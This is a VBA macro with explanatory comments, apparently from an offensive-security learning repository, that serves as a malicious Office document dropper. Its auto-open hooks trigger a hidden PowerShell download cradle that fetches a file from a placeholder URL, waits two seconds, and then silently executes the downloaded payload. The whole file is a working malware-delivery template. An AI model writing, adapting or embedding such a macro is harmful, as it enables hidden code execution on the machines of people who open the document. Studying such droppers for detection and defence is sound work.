Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

' Both methods above make the macro run when document gets open. Only one is required for correct performance.

Sub MyMacro()
    Dim str As String 
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('<URL>', '<OUTFILE>')" 
    Shell str, vbHide
    ' Defines 'str' as a String and assigns the 'http powershell download cradles one-liner' and uses the Shell function to execute it in a hidden window (vbHide).

    Dim exePath As String
    exePath = ActiveDocument.Path + "\<OUTFILE>"
    Wait (2)
    Shell exePath, vbHide
    ' Defines 'exePath' as String, asigns the location path of the downloaded payload (the same directory in which is stored the document. This is gathered with: ActiveDocument.Path), stablish a delay of two seconds (Wait (2)) to ensure the file's download has finished and uses Shell function to execute the payload using the complete path.

End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub

' This method defines a function (Wait) which accepts an integer as an argument and makes a delay of that number of seconds. More information on TimeDelay.vba script in the same repository.


' IN SUMMARY; this VBA script downloads a file through a HTTP request stored on a certain URL and store its contents on the same location in which is stored the document with the name: OUTFILE. Then makes a delay to ensure the correct download of the file and execute it. 